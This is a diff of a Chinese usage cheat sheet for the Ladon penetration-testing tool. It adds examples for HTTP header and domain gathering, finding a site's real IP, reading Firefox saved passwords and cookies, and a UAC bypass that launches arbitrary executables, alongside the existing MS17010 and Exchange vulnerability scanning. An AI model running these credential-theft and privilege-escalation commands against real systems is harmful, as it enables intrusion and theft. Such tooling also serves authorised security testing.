@@ -1,18 +1,20 @@
 Ladon 简明使用教程 完整文档: http://k8gege.org/Ladon 
-支持Cmd、Shell、Cobalt Strike、PowerShell下使用
+支持Cmd、Cobalt Strike、PowerShell等内存加载
 Windows版本: .Net、Cobalt Strike、PowerShell
 全系统版本：GO(全平台)、Python(理论上全平台)
-PS: GUI版主要方便本地测试使用，完整功能使用CMD
+PS: Study方便本地测试使用，完整功能请使用CMD
 
 ### 版本
-Ladon9.3.0 20221128
-简明用法例子 178例
+Ladon 10.1 20221208
+简明用法例子 184例
 
 ### 001 自定义线程扫描
 例子：扫描目标10.1.2段是否存在MS17010漏洞
 单线程：Ladon 10.1.2.8/24 MS17010 t=1
 80线程：Ladon noping 10.1.2.8/24 MS17010 t=80
-在高强度防护下的网络默认线程无法扫描，必须单线程
+
+高强度防护下扫描线程设置低一些，单线程或F单线程最佳
+单线程：Ladon 10.1.2.8/24 MS17010 f=1
 
 ### 002 Socks5代理扫描
 例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）
@@ -727,9 +729,45 @@ Ladon noping ip.txt vsFTPdPoc
 ##### 176 WpScan WordPress密码审计、弱口令
 Ladon http://192.168.1.8 WpScan
 Ladon url.txt WpScan
+Ladon 192.168.1.8/24 WpScan http  扫描IP时添加http://
 
 ##### 177  探测Exchange版本不会触发WAF
 Ladon 192.168.1.8/24 ExchangeVer
 
 ##### 178  Exchange高危RCE漏洞检测
 Ladon https://192.168.1.8 ExchangePoc
+
+##### 179 Http/S获取网页返回头信息
+Ladon https://192.168.1.8 GetHead
+Ladon ip.txt GetHead
+Ladon 192.168.1.8/24 GetHead http  扫描IP时添加http://
+Ladon ip.txt GetHead https		   扫描IP时添加https://
+
+##### 180 Http/S获取网页返回头信息+源码
+Ladon https://192.168.1.8 GetHtml
+Ladon ip.txt GetHtml
+Ladon 192.168.1.8/24 GetHtml http
+Ladon ip.txt GetHtml https		   扫描IP时添加https://
+
+##### 181 Http/S获取网页中的域名
+Ladon https://192.168.1.8 GetDomain
+Ladon ip.txt GetDomain
+Ladon 192.168.1.8/24 GetDomain http
+Ladon ip.txt GetDomain https		   扫描IP时添加https://
+
+##### 182 TrueIP获取域名真实IP(可用域名、标题、Banner等唯一关键字特征)
+Ladon ip.txt TrueIP k8gege.org
+Ladon 192.168.1.8/24 TrueIP k8gege.org
+Ladon ip.txt TrueIP "K8哥哥"
+Ladon 192.168.1.8/24 TrueIP "K8哥哥"
+
+##### 183 Firefox密码\Cookie\历史记录读取
+Ladon FirefoxPwd
+Ladon FirefoxHistory
+Ladon FirefoxCookie
+
+##### 184  BypassUAC11无回显支持Win7、Win8、Win11 Win2012\2016\2019等
+Ladon40 BypassUAC11 cmd
+Ladon40 BypassUAC11 c:\1.bat
+Ladon40 BypassUAC11 c:\1.exe
+
